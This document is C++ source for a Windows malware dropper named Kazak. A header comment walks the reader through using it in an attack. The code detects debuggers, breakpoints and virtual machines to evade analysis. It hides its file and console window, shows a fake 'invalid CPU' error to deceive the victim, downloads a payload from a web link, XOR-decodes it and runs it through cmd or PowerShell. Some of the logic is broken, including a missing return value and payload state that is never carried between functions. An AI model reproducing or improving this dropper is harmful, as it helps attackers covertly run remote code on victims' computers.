
/* How to create an attack using this dropper you may ask, well i gotchu

1. Put your payload inlined inside a text file on a webserver, be sure it works and u tested it.
2. Edit the link to where the raw payload is stored.
3. In case of POWERSHELL payloads and not Command Prompt commands, be sure to put "powershell" in front of the payload.
4. Enjoy.

*/

#include "../headers/Kazak.h"

BOOL KazakDropper::IsBp(const char* lpszModule, const char* lpszFunction)
{
	HINSTANCE hLibrary;
	DWORD lpProc;

	hLibrary = li(GetModuleHandleA)(lpszModule);

	if (hLibrary == NULL)
	{
		hLibrary = li(LoadLibraryA)(lpszModule);
	}

	if (hLibrary != NULL)
	{
		lpProc = (DWORD)li(GetProcAddress)(hLibrary, lpszFunction);

		if (lpProc != 0)
		{
			if (*(BYTE*)lpProc == 0xCC) return TRUE;
		}

	}

	return FALSE;
}

bool KazakDropper::EvadeAnalysis()
{
	int iNumberOfThreads = std::thread::hardware_concurrency();

	if (KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetModuleHandleA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("LoadLibraryA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetProcAddress")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetOpenA")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetOpenUrl")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetReadFile")) || KazakDropper::IsBp(enc("Wininet.dll"), enc("InternetCloseHandle")))
		return TRUE;

	else if (IsDebuggerPresent())
		return TRUE;

	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\drivers\\vmxnet.sys")))
		return TRUE;

	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\vboxdisp.dll")))
		return TRUE;

	else if (iNumberOfThreads == 4)
		return TRUE;

}

void KazakDropper::Stealth()
{
	li(SetFileAttributesA)(enc("Kazak.exe"), FILE_ATTRIBUTE_HIDDEN);
	li(ShowWindow)(GetConsoleWindow(), SW_HIDE);

	MessageBoxA(
		NULL,
		enc("This software is not able to execute on your current CPU architecture."),
		enc("Fatal Error - Invalid CPU"),
		MB_ICONERROR | MB_OKCANCEL); // fake error

	std::this_thread::sleep_for(std::chrono::seconds(5));
}

std::string KazakUtils::replace_all(std::string subject, const std::string& search, const std::string& replace)
{
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != std::string::npos)
	{
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

std::string KazakUtils::StringWrapper(const std::string url)
{
	const HINTERNET connection = li(InternetOpenA)(enc("list_access\r\n"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, NULL);
	std::string rtn;
	if (connection)
	{
		const HINTERNET url_file = li(InternetOpenUrlA)(connection, url.c_str(), nullptr, NULL, NULL, NULL);
		if (url_file)
		{
			char buffer[2000];
			DWORD bytes_read;
			do
			{
				li(InternetReadFile)(url_file, buffer, 2000, &bytes_read);
				rtn.append(buffer, bytes_read);
				memset(buffer, 0, 2000);
			} while (bytes_read);
			li(InternetCloseHandle)(connection);
			li(InternetCloseHandle)(url_file);
			std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
			return p;
		}
	}
	li(InternetCloseHandle)(connection);
	std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
	return p;
}

void KazakDropper::PreparePayload()
{
	Storage S;

	S.PayloadLink = enc("RAW PAYLOAD LINK");
	S.EncryptedPayload = KazakUtils::StringWrapper(S.PayloadLink);
	S.XorKey = enc("Kazak");

	for (int x = 0; x < 10; x++)
		S.DecryptedPayload[x] = S.EncryptedPayload[x] ^ S.XorKey[x];



}

void KazakDropper::DropPayload(std::string payload)
{
	Storage S;
	if (!payload.find(enc("powershell")))
		S.CmdPayload = true;
	else
		S.PowerShellPayload = true;

	if (S.CmdPayload)
		li(system)(payload.c_str());
	else
		li(system)(enc("powershell") + payload);

}

int main()
{
	Storage S;

	while (!li(InternetCheckConnectionA)(enc("https://google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
		Sleep(1000);

	KazakDropper::Stealth();

	while (!KazakDropper::EvadeAnalysis())
	{
		KazakDropper::PreparePayload();
		
		KazakDropper::DropPayload(S.DecryptedPayload);

		exit(-1);

	}

	if (KazakDropper::EvadeAnalysis())
		return 0;

	return 0;

}
